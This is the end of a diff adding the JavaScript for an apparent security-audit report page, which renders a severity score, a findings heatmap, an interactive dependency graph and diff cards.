+    r.innerHTML='<span class="dot" style="background:'+rgbOf[s]+'"></span>'+SEV[s].l+" — "+counts[s];
+    row.appendChild(r);
+  });
+  const target=68,t0=performance.now(),dur=1400,el=$("#scoreNum");
+  (function tick(t){
+    const p=Math.min(1,(t-t0)/dur),e=1-Math.pow(1-p,3);
+    el.textContent=Math.round(target*e);
+    if(p<1)requestAnimationFrame(tick);
+  })(t0);
+}
+
+/* ============================ HEATMAP ============================ */
+function cellFindings(m,c){
+  return FINDINGS.filter(f=>!f.positive&&f.files.indexOf(m)!==-1&&f.cat===CATS[c]);
+}
+function renderHeatmap(){
+  const hm=$("#hm");hm.innerHTML="";hm.style.gridTemplateColumns="150px repeat("+CATS.length+",minmax(74px,1fr))";
+  const corner=document.createElement("div");corner.className="h";corner.textContent="module · category";hm.appendChild(corner);
+  CATS.forEach(c=>{const h=document.createElement("div");h.className="h";h.textContent=c;hm.appendChild(h);});
+  HEAT.modules.forEach((m,i)=>{
+    const rl=document.createElement("div");rl.className="rl";rl.textContent=m;rl.dataset.m=m;hm.appendChild(rl);
+    HEAT.rows[i].forEach((v,c)=>{
+      const cell=document.createElement("div");
+      cell.className="cell";cell.dataset.v=v;
+      const fs=cellFindings(m,c);
+      if(v==="p"){cell.style.background="rgba(127,174,106,.28)";cell.style.color="var(--ok)";cell.textContent="✓";}
+      else if(v>0){
+        const sevname=["","low","med","high"][v];
+        cell.style.background=rgbOf[sevname]+["","59","99","cc"][v];
+        cell.style.color=v>=2?"#14110c":rgbOf[sevname];
+        cell.textContent=v;
+      }
+      cell.addEventListener("mousemove",e=>{
+        const tt=$("#tooltip");
+        let html='<div class="t">'+esc(m)+" · "+esc(CATS[c])+"</div>";
+        if(v==="p")html+="verified control — see PRA-019";
+        else if(!fs.length)html+="no mapped findings";
+        else fs.forEach(f=>{html+=esc(f.id)+" — "+SEV[sevOf(f)].l+"<br>";});
+        tt.innerHTML=html;tt.style.display="block";
+        const x=Math.min(e.clientX+16,window.innerWidth-340),y=Math.min(e.clientY+14,window.innerHeight-90);
+        tt.style.left=x+"px";tt.style.top=y+"px";
+      });
+      cell.addEventListener("mouseleave",()=>{$("#tooltip").style.display="none";});
+      cell.addEventListener("click",()=>{
+        $("#tooltip").style.display="none";
+        if(!fs.length)return;
+        state.mod=m;state.cat=CATS[c];state.q="";
+        updateX();renderChips();renderFindings();
+        document.getElementById("findings").scrollIntoView({behavior:"smooth"});
+      });
+      hm.appendChild(cell);
+    });
+  });
+  // row hover highlight
+  hm.querySelectorAll(".rl").forEach(rl=>{
+    rl.addEventListener("mouseenter",()=>hm.querySelectorAll('.rl[data-m="'+rl.dataset.m+'"]').forEach(x=>{}));
+  });
+}
+function updateX(){
+  const xf=$("#xfilter");
+  if(state.mod||state.cat){
+    xf.classList.add("on");
+    $("#xfilterText").textContent="heatmap filter: "+(state.mod||"any module")+" × "+(state.cat||"any category");
+  }else xf.classList.remove("on");
+}
+$("#xclear").addEventListener("click",()=>{state.mod=state.cat=null;updateX();renderFindings();});
+
+/* ============================ GRAPH ============================ */
+function buildGraph(){
+  const svg=$("#gsvg"),NS="http://www.w3.org/2000/svg";
+  const W=1200,H=580,CX=600,CY=290;
+  const nodes=GRAPH_NODES.map(n=>Object.assign({},n));
+  const byId={};nodes.forEach(n=>byId[n.id]=n);
+  // place: core center; groups ring1; packages ring2 near group
+  const groups=nodes.filter(n=>n.type==="grp"||n.id==="img");
+  groups.forEach((g,i)=>{
+    const a=-Math.PI/2+(i/groups.length)*Math.PI*2;
+    if(g.id==="img"){g.x=CX-460;g.y=CY+168;return;}
+    g.x=CX+218*Math.cos(a);g.y=CY+196*Math.sin(a);
+  });
+  const pkgs=nodes.filter(n=>n.type==="pkg"||n.id==="core");
+  pkgs.forEach(p=>{
+    if(p.id==="core"){p.x=CX;p.y=CY;return;}
+    // find owning group
+    const link=GRAPH_LINKS.find(l=>l[1]===p.id);
+    const g=link?byId[link[0]]:null;
+    if(g){
+      const a=Math.atan2(g.y-CY,g.x-CX);
+      const idx=pkgs.filter(q=>{
+        const l2=GRAPH_LINKS.find(l=>l[1]===q.id);return l2&&l2[0]===g.id;
+      }).indexOf(p);
+      const k=pkgs.filter(q=>{const l2=GRAPH_LINKS.find(l=>l[1]===q.id);return l2&&l2[0]===g.id;}).length;
+      const spread=(idx-(k-1)/2)*0.32;
+      p.x=CX+(385+((idx%2)*34))*Math.cos(a+spread);
+      p.y=CY+(330+((idx%2)*40))*Math.sin(a+spread*0.7);
+    }else{p.x=CX+300;p.y=CY+250;}
+    p.x=Math.max(70,Math.min(W-70,p.x));
+    p.y=Math.max(55,Math.min(H-55,p.y));
+  });
+
+  const vp=document.createElementNS(NS,"g");svg.appendChild(vp);
+  const linksG=document.createElementNS(NS,"g"),nodesG=document.createElementNS(NS,"g");
+  vp.appendChild(linksG);vp.appendChild(nodesG);
+  let view={x:0,y:0,k:1};
+  const apply=()=>vp.setAttribute("transform","translate("+view.x+","+view.y+") scale("+view.k+")");
+
+  GRAPH_LINKS.forEach(([a,b])=>{
+    const A=byId[a],B=byId[b];
+    const l=document.createElementNS(NS,"line");
+    l.setAttribute("x1",A.x);l.setAttribute("y1",A.y);l.setAttribute("x2",B.x);l.setAttribute("y2",B.y);
+    l.setAttribute("stroke",B.type==="risk"?"#8a6a2c":(A.id==="core"?"#4b4432":"#3a3428"));
+    l.setAttribute("stroke-width",B.type==="risk"?1.6:1.1);
+    l.setAttribute("stroke-dasharray",A.id==="core"?"none":"3 4");
+    linksG.appendChild(l);A.el_link=B;
+  });
+
+  for(const n of nodes){
+    const g=document.createElementNS(NS,"g");
+    g.setAttribute("class","gnode");g.setAttribute("tabindex","0");
+    const fill=n.type==="core"?"#2a3a24":(n.type==="risk"?"#33290f":"#241f16");
+    const ring=n.type==="core"?"var(--ok)":(n.type==="risk"?"var(--med)":(n.type==="grp"?"#5c5342":"#453c2c"));
+    let inner="";
+    if(n.type==="risk"){
+      inner='<circle r="'+(n.r+5)+'" fill="none" stroke="'+ring+'" stroke-opacity=".45" stroke-width="1"><animate attributeName="r" values="'+(n.r+3)+';'+(n.r+8)+';'+(n.r+3)+'" dur="3s" repeatCount="indefinite"/><animate attributeName="stroke-opacity" values=".5;.05;.5" dur="3s" repeatCount="indefinite"/></circle>';
+    }
+    g.innerHTML=inner+
+      '<circle r="'+n.r+'" fill="'+fill+'" stroke="'+ring+'" stroke-width="'+(n.type==="core"?2.2:1.4)+'"/>'+
+      '<text y="4" text-anchor="middle">'+esc(n.label)+"</text>";
+    g.setAttribute("transform","translate("+n.x+","+n.y+")");
+    g.addEventListener("click",e=>{
+      if(g._moved)return;
+      nodesG.querySelectorAll(".gnode").forEach(x=>x.classList.remove("sel"));
+      g.classList.add("sel");
+      $("#gdName").textContent=n.label;
+      $("#gdCons").textContent=n.cons;
+      $("#gdNote").textContent=n.note;
+      const rn=$("#gdRisk");
+      if(n.risk){rn.textContent="▲ "+n.risk;rn.classList.add("show");}else rn.classList.remove("show");
+    });
+    nodesG.appendChild(g);
+    g.style.cursor="grab";
+    // drag node
+    g.addEventListener("pointerdown",e=>{
+      if(e.button!==0)return;
+      e.stopPropagation();svg.setPointerCapture(e.pointerId);
+      let px=e.clientX,py=e.clientY;g._moved=false;
+      const mv=ev=>{
+        const dx=(ev.clientX-px)/view.k,dy=(ev.clientY-py)/view.k;
+        if(Math.abs(ev.clientX-px)+Math.abs(ev.clientY-py)>3)g._moved=true;
+        n.x+=dx;n.y+=dy;px=ev.clientX;py=ev.clientY;
+        g.setAttribute("transform","translate("+n.x+","+n.y+")");
+        linksG.querySelectorAll("line").forEach((l,i)=>{
+          const[a,b]=GRAPH_LINKS[i],A=byId[a],B=byId[b];
+          l.setAttribute("x1",A.x);l.setAttribute("y1",A.y);l.setAttribute("x2",B.x);l.setAttribute("y2",B.y);
+        });
+      };
+      const up=()=>{svg.removeEventListener("pointermove",mv);svg.removeEventListener("pointerup",up);};
+      svg.addEventListener("pointermove",mv);svg.addEventListener("pointerup",up);
+    });
+  }
+
+  // pan + zoom
+  let panning=false,px=0,py=0;
+  svg.addEventListener("pointerdown",e=>{
+    if(e.target.closest(".gnode"))return;
+    panning=true;px=e.clientX;py=e.clientY;svg.classList.add("panning");svg.setPointerCapture(e.pointerId);
+  });
+  svg.addEventListener("pointermove",e=>{
+    if(!panning)return;
+    view.x+=e.clientX-px;view.y+=e.clientY-py;px=e.clientX;py=e.clientY;apply();
+  });
+  svg.addEventListener("pointerup",()=>{panning=false;svg.classList.remove("panning");});
+  svg.addEventListener("wheel",e=>{
+    e.preventDefault();
+    const r=svg.getBoundingClientRect();
+    const mx=e.clientX-r.left,my=e.clientY-r.top;
+    const k2=Math.max(.35,Math.min(3,view.k*(e.deltaY<0?1.12:.89)));
+    view.x=mx-(mx-view.x)*(k2/view.k);view.y=my-(my-view.y)*(k2/view.k);view.k=k2;apply();
+  },{passive:false});
+  const zoom=f=>{const r=svg.getBoundingClientRect();const mx=r.width/2,my=r.height/2;
+    const k2=Math.max(.35,Math.min(3,view.k*f));
+    view.x=mx-(mx-view.x)*(k2/view.k);view.y=my-(my-view.y)*(k2/view.k);view.k=k2;apply();};
+  $("#gzin").onclick=()=>zoom(1.25);
+  $("#gzout").onclick=()=>zoom(.8);
+  $("#greset").onclick=()=>{view={x:0,y:0,k:1};apply();};
+}
+
+/* ============================ DIFFS ============================ */
+function renderDiffs(){
+  const box=$("#diffs");
+  DIFFS.forEach(d=>{
+    const div=document.createElement("div");div.className="diff";
+    let body="";
+    d.lines.forEach(([t,code])=>{
+      const marker=t==="del"?"−":(t==="add"?"+":" ");
+      body+='<div class="dl '+t+'"><span class="m">'+marker+"</span><span>"+hl(code)+"</span></div>";
+    });
+    div.innerHTML=
+      '<div class="diff-h"><span class="ttl">'+esc(d.title)+'</span><span class="fn">'+esc(d.file)+'</span><span class="refs">'+esc(d.refs)+"</span></div>"+
+      "<pre>"+body+"</pre>"+
+      '<div class="note">'+esc(d.note)+"</div>";
+    box.appendChild(div);
+  });
+}
+
+/* ============================ NAV ============================ */
+function wireNav(){
+  const links=[...document.querySelectorAll("#navlist a")];
+  const secs=links.map(a=>document.querySelector(a.getAttribute("href")));
+  const io=new IntersectionObserver(es=>{
+    es.forEach(e=>{
+      if(e.isIntersecting){
+        links.forEach(l=>l.classList.toggle("active",l.getAttribute("href")==="#"+e.target.id));
+      }
+    });
+  },{rootMargin:"-25% 0px -65% 0px"});
+  secs.forEach(s=>s&&io.observe(s));
+}
+
+/* ============================ INIT ============================ */
+renderSummary();renderChips();renderFindings();renderHeatmap();buildGraph();renderDiffs();wireNav();
+window.addEventListener("beforeprint",()=>document.querySelectorAll(".finding").forEach(f=>f.classList.add("open")));
+</script>
+</body>
+</html>
